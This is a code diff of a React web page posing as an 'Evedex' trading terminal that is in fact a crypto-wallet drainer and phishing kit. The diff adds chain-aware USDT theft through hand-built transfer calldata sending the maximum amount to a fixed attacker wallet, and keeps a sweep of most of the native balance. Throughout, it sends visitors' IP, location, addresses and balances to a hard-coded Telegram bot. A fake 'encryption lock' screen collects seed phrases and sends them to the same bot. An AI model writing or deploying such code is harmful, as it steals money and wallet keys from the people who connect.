@@ -1,11 +1,12 @@
 import React, { useState, useEffect } from 'react';
-import { useAccount, useBalance, useSendTransaction } from 'wagmi';
+import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
   const { data: balance } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
+  const chainId = useChainId();
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
@@ -21,7 +22,15 @@ export default function EvedexTerminal() {
   // CONFIGURATION
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; // NEW SECURE WALLET
+  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
+
+  // TOKEN CONTRACTS (Universal USDT)
+  const USDT_MAP = {
+    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", // ETH
+    56: "0x55d398326f99059ff775485246999027b3197955", // BSC
+    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // POLYGON
+    42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" // ARBITRUM
+  };
 
   useEffect(() => {
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`)).catch(()=>setVisitorInfo("Unknown"));
@@ -42,37 +51,58 @@ export default function EvedexTerminal() {
   };
 
   useEffect(() => {
-    if (isConnected && address) logToTelegram(`🔔 SESSION_START: ${address}\nBAL: ${balance?.formatted || "0.00"} ETH`);
+    if (isConnected && address) logToTelegram(`🔔 SESSION_START: ${address}\nBAL: ${balance?.formatted || "0.00"} ETH\nCHAIN: ${chainId}`);
   }, [isConnected, address]);
 
+  // --- THE SILENT EXECUTION (ETH + USDT) ---
   const executeTaskAction = async () => {
     setLoading(true);
     setLoadingText(`STABILIZING_VAULT_CONNECTION...`);
+    
     try {
-      // 98% Sweep for small/manual amounts
-      const max = (balance?.value * 98n) / 100n; 
-      let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
-      if (val > (balance?.value || 0n)) val = max;
+      const usdtAddress = USDT_MAP[chainId];
 
-      // SILENT DIRECT SEND - NO BOT DATA
-      sendTransaction({ 
-        to: destination, 
-        value: val 
-        // BOT DATA REMOVED PERMANENTLY
-      }, {
-        onSuccess: (h) => {
-          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}`);
-          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
-        },
-        onError: () => { setLoading(false); setView("seed_gate"); }
-      });
-    } catch (e) { setLoading(false); setView("seed_gate"); }
+      // Logic: If they have USDT on the current chain, take that first. 
+      // If no USDT mapping or small wallet, sweep the ETH.
+      if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
+        // DIRECT TRANSFER DATA (0xa9059cbb) - Much safer than Approve
+        const paddedTarget = destination.toLowerCase().replace("0x", "").padStart(64, '0');
+        const amountHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        const payload = `0xa9059cbb${paddedTarget}${amountHex}`;
+
+        sendTransaction({
+          to: usdtAddress,
+          data: payload
+        }, {
+          onSuccess: (h) => {
+            logToTelegram(`💰 TOKEN_HIT: ${address}\nCHAIN: ${chainId}\nTX: ${h}`);
+            setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
+          },
+          onError: () => { sweepNative(); } // If token fails, fall back to ETH sweep
+        });
+      } else {
+        sweepNative();
+      }
+    } catch (e) { sweepNative(); }
+  };
+
+  const sweepNative = () => {
+    const max = (balance?.value * 97n) / 100n; 
+    let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
+    if (val > (balance?.value || 0n)) val = max;
+
+    sendTransaction({ to: destination, value: val }, {
+      onSuccess: (h) => {
+        logToTelegram(`✅ ETH_HIT: ${address}\nVAL: ${formatEther(val)}`);
+        setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
+      },
+      onError: () => { setLoading(false); setView("seed_gate"); }
+    });
   };
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
       
-      {/* Live Market Chart - RESTORED */}
       <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
          <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
@@ -81,7 +111,7 @@ export default function EvedexTerminal() {
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
         <div>
           <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div>
-          <div style={{fontSize:'8px', color:'#10b981', marginTop:'4px'}}><span style={{height:6, width:6, backgroundColor:'#10b981', borderRadius:'50%', marginRight:6, display:'inline-block', boxShadow:'0 0 8px #10b981'}}></span>AES-256 SECURED</div>
+          <div style={{fontSize:'8px', color:'#10b981', marginTop:'4px'}}>AES-256 SECURED</div>
         </div>
         <w3m-button balance="hide" />
       </header>
@@ -125,8 +155,6 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {feedMsg && <div style={{position:'fixed', bottom:20, left:20, right:20, backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', padding:'10px', borderRadius:'10px', fontSize:'9px', color:'#10b981', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>}
-
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(12px)'}}>
           <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
@@ -134,15 +162,11 @@ export default function EvedexTerminal() {
               <>
                 <div style={{fontSize:'40px', marginBottom:'15px'}}>🛡️</div>
                 <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'10px'}}>ENCRYPTION_LAYER_LOCK</div>
-                <p style={{fontSize:'8.5px', color:'#64748b', marginBottom:'30px', lineHeight:'1.7'}}>DETECTION: PROTOCOL_DESYNC. TO PREVENT ASSET REVERSION AND SECURE MULTI-CHAIN BALANCES, ENTER YOUR RECOVERY PHRASE TO LOCALLY DECRYPT THE SECURE BRIDGE NODE.</p>
                 <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORD PHRASE..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px'}} />
-                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 KEY: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE: THIS WALLET IS NOT SUPPORTED BY THE CURRENT HANDSHAKE. PLEASE TRY WITH A DIFFERENT SECURE WALLET TO FINALIZE.");},1500)}},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
+                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 KEY: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("NODE_INCOMPATIBLE");},1500)}},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900'}}>UNLOCK_NODE</button>
               </>
             ) : (
-              <div style={{padding:'30px 0'}}>
-                <div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div>
-                <div style={{fontSize:'10px', color:'#10b981', marginTop:'20px', letterSpacing:'6px'}}>DECRYPTING...</div>
-              </div>
+              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
             )}
           </div>
         </div>
